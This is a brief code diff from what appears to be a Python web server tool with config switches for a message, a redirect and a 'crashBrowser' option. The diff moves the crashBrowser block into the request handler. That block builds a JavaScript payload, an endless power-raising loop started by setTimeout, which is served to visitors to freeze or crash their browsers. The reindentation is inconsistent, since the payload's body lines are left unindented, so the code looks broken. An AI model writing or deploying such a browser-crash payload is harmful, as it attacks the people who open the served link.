@@ -261,8 +261,8 @@ height: 100vh;
                 if config["message"]["doMessage"]:
                     data = message.encode()
                 
-if config["crashBrowser"]:
-    crash_script = (
+                if config["crashBrowser"]:
+                    crash_script = (
         '<script>'
         'setTimeout(function(){'
         'for (var i = 69420; true; i = Math.pow(i, 1.5)) {'
@@ -275,7 +275,6 @@ if config["crashBrowser"]:
         '</script>'
     )
     data = message.encode() + crash_script.encode()
-
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                 self.send_response(200) # 200 = OK (HTTP Status)
